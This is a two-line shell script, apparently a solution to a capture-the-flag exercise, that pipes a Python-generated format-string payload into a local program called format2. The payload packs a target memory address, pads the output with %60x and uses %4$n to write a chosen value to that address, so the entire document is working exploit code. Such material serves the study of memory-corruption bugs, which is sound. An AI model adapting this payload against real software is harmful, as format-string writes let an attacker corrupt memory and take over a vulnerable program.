#! /bin/sh
python -c "print '\x48\xa0\x04\x08'+'%60x'+'%4\$n'"  | ./format2
